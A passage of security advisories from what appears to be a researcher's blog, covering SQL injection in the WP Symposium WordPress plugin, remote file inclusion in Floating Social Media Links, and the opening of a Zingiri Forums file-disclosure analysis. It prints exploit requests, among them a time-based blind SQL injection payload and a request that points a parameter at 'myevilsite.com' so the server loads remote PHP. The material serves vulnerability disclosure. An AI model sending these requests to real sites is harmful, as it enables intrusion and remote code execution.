class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// already exists</span></div><div class="crayon-line" id="crayon-53c987717c960029536910-1561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p>Notice that it simply concatenates the $friend_to variable into the query. While this query is not used for output, we can still do a blind SQL injection if we&#8217;re logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c96a300652713" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_profile_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

action=addFriend&amp;friend_to=1 AND 1=2) UNION SELECT SLEEP(10), 2, 3, 4, 5, 6; --</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c96a300652713-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c96a300652713-2">2</div><div class="crayon-num" data-line="crayon-53c987717c96a300652713-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c96a300652713-4">4</div><div class="crayon-num" data-line="crayon-53c987717c96a300652713-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c96a300652713-6">6</div><div class="crayon-num" data-line="crayon-53c987717c96a300652713-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c96a300652713-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c96a300652713-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_profile_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c96a300652713-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987717c96a300652713-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c96a300652713-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987717c96a300652713-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c96a300652713-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">76</span></div><div class="crayon-line" id="crayon-53c987717c96a300652713-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c96a300652713-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">addFriend</span><span class="crayon-o">&amp;</span><span class="crayon-v">friend_to</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0056 seconds] -->
<p><strong> </strong></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="http://ceriksen.com/tag/symposium/" rel="tag">Symposium</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/#respond" title="Comment on WP Symposium multiple SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-132 -->

				
					
<article id="post-213" class="post-213 post type-post status-publish format-standard hentry category-advisories tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/" title="4:44 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-12T16:44:34+00:00" pubdate>January 12, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/" title="Permalink to WordPress Floating Social Media Link Plugins Remote File Inclusion" rel="bookmark">WordPress Floating Social Media Link Plugins Remote File Inclusion</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<div><strong>Advisory</strong></div>
<p><a href="http://secunia.com/advisories/51346/"></p>
<div>Secunia Advisory SA51346</div>
<div></div>
<p></a></p>
<div><b>Analysis</b></div>
<div>The fsml-admin.js.php and fsml-hideshow.js.php both require a get parameter to specify the path for the wp-load.php file, used to initialize the WordPress backend.</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717d5ff467232443" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//include the wordpress environment, so we can get the options and 
//write the js accordingly
REQUIRE $_GET['wpp'] . '/wp-load.php';</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717d5ff467232443-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717d5ff467232443-2">2</div><div class="crayon-num" data-line="crayon-53c987717d5ff467232443-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717d5ff467232443-1"><span class="crayon-c">//include the wordpress environment, so we can get the options and </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717d5ff467232443-2"><span class="crayon-c">//write the js accordingly</span></div><div class="crayon-line" id="crayon-53c987717d5ff467232443-3"><span class="crayon-k ">REQUIRE</span><span class="crayon-h"> </span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wpp'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-load.php'</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->

</div>
<div>However the wpp parameter is used without validation that it does not contain a malicious input. We can thus provide an url to malicious PHP code, which will be executed by the remote host, like this:</div>
<div></div>
<div>
<!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717d619496377041" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/floating-social-media-links/fsml-hideshow.js.php?wpp=http://myevilsite.com HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717d619496377041-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717d619496377041-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717d619496377041-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">floating</span><span class="crayon-o">-</span><span class="crayon-i">social</span><span class="crayon-o">-</span><span class="crayon-i">media</span><span class="crayon-o">-</span><span class="crayon-i">links</span><span class="crayon-o">/</span><span class="crayon-i">fsml</span><span class="crayon-o">-</span><span class="crayon-v">hideshow</span><span class="crayon-sy">.</span><span class="crayon-v">js</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">wpp</span><span class="crayon-o">=</span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//myevilsite.com HTTP/1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717d619496377041-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0019 seconds] -->
<br />
&nbsp;</p>
</div>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/rfi/" rel="tag">RFI</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/#respond" title="Comment on WordPress Floating Social Media Link Plugins Remote File Inclusion">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-213 -->

				
					
<article id="post-164" class="post-164 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-zingiri-forums">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="3:43 am" rel="bookmark" class="entry-date"><time datetime="2013-01-12T03:43:07+00:00" pubdate>January 12, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="Permalink to WordPress Zingiri Forums arbitrary file disclosure" rel="bookmark">WordPress Zingiri Forums arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50833/">Secunia Advisory SA50833</p>
<p></a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Zingiri Web Forums for WordPress writes our a header for the forum in <a href="http://plugins.svn.wordpress.org/zingiri-forum/tags/1.4.2/forum.php">forum.php</a> through adding an action to wp_head.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717dd58429495767" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('wp_head','zing_forum_header');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717dd58429495767-44">44</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717dd58429495767-44"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'wp_head'</span><span class="crayon-sy">,</span><span class="crayon-s">'zing_forum_header'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717dd67530044901" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function zing_forum_header()
{
	global $zing_forum_content;
	global $zing_forum_menu;
	$output=zing_forum_output("content");

	zing_integrator_cut($output,'&lt;div id="footer"&gt;','&lt;/div&gt;'); //remove footer
	zing_integrator_cut($output,'&lt;span class="forgot_password"&gt;','&lt;/span&gt;');

	$zing_forum_content=$output;

	echo '&lt;script type="text/javascript" language="javascript"&gt;';
	echo "var zing_forum_url='".ZING_FORUM_URL."ajax/';";
	echo "var zing_forum_index='".get_option('home')."/index.php?';";
	echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";
	echo '&lt;/script&gt;';

	echo '&lt;link rel="stylesheet" type="text/css" href="' . ZING_FORUM_URL . 'zing.css" media="screen" /&gt;';
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717dd67530044901-686">686</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-687">687</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-688">688</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-689">689</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-690">690</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-691">691</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-692">692</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-693">693</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-694">694</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-695">695</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-696">696</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-697">697</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-698">698</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-699">699</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-700">700</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-701">701</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-702">702</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717dd67530044901-703">703</div><div class="crayon-num" data-line="crayon-53c987717dd67530044901-704">704</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717dd67530044901-686"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_header</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-687"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-688"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_content</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-689"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_menu</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-690"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-s">"content"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-691">&nbsp;</div><div class="crayon-line" id="crayon-53c987717dd67530044901-692"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;div id="footer"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">//remove footer</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-693"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;span class="forgot_password"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/span&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-694">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-695"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_content</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-696">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-697"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'<span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-h"> </span><span class="crayon-e ">language</span><span class="crayon-o">=</span><span class="crayon-s">"javascript"</span><span class="crayon-o">&gt;</span><span class="crayon-s">';</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-698"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_url='</span><span class="crayon-s">".ZING_FORUM_URL."</span><span class="crayon-i">ajax</span><span class="crayon-c ">/';";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-699"><span class="crayon-c ">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_index='".get_option('home')."/i</span><span class="crayon-v">ndex</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-s">';";</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-700"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-701"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo '</span><span class="crayon-ta">&lt;/script&gt;</span>'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-702">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717dd67530044901-703"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;link rel="stylesheet" type="text/css" href="'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">ZING_FORUM_URL</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'zing.css" media="screen" /&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717dd67530044901-704"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0078 seconds] -->
<p>So on each load of the WordPress blog it will call into zing_forum_header. The first call it makes it into zing_forum_output, which is rather long. I&#8217;ve highlighted two areas:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

